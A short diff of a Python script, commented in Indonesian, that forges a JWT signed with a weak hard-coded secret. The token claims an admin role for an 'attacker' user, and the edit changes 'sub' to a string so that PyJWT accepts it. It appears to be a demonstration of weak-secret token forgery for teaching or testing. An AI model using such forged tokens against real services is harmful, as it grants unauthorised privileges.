@@ -24,8 +24,9 @@ import urllib.request
 SECRET = "rahasia-super-lemah"
 
 # Klaim palsu: role=admin (di database attacker tetap user biasa).
+# "sub" berupa string agar lolos validasi PyJWT (wajib string).
 PAYLOAD = {
-    "sub": 999,
+    "sub": "999",
     "username": "attacker",
     "role": "admin",
     "iat": 0,
